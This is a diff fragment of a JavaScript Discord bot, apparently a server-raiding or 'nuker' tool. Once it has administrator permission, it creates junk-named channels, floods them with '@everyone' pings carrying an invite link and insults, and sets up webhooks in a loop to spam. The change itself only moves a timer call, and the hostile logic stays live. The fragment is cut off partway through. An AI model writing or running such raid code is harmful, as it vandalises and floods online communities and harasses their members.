@@ -280,13 +280,13 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
        if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
         var number = 0
         var pray = -1
-        setTimeout(() => { 
            msg.guild.channels.create('⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰').then(p => {
                 p.send("@everyone all hail me")
                 p.send("https://discord.gg/hKVK9r7DGt @everyone")
                 p.send("kiss my disrespectful ass @everyone")
                 p.send("wait 7 seconds for the spam btw")
              })
+        setTimeout(() => { 
           while(pray < 2) {
          msg.guild.channels.create('匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂').then(p => {
             p.createWebhook("assy").then(w => {
